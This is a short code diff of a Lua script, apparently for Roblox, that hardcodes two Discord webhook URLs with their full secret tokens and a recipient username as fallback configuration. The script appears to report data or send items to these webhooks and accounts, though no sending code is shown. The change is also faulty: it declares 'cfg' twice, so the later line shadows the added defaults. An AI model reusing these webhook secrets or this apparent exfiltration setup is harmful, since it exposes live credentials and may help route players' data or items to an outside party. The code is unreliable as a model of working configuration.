@@ -1,11 +1,12 @@
 local ExtraUsers = {"CREOLEO23"}
 local Friends = {}
 
-if not _G["Script-SM_Config"] then
-    warn("WARNING: Config not loaded! Waiting for config...")
-    repeat task.wait() until _G["Script-SM_Config"]
-    warn("Config loaded successfully!")
-end
+local cfg = _G["Script-SM_Config"] or {
+    user_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa",
+    dual_webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo",
+    users = {"CREOLEO23"}
+}
+warn("Config initialized using internal defaults!")
 
 local cfg = _G["Script-SM_Config"] or {}
 local Webhook = cfg.user_webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
